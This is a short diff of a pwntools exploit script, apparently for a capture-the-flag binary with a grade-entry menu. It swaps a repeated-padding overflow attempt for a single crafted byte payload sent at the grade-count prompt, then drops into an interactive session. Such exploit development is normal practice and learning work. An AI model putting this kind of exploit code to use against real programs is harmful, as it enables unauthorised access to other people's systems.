@@ -16,21 +16,15 @@ b *0x004010e7
 b *0x4010f1
 ''')
 
-payload = b''
-payload += b'0' * 32
-payload2 = b'1' * 8
-
 # 2. Add New.
-p.recv()
+p.recvline()
 p.sendline(b'2')
 
 # Number of Grades:
-p.recv()
-p.sendline(b'35')
 
-for i in range(35):
-    p.sendline(payload)
-
-p.sendline(payload2)
+payload = b'\x00\x00\x00\x41'
+p.recvline()
+p.sendline(payload)
 
 p.interactive()
+
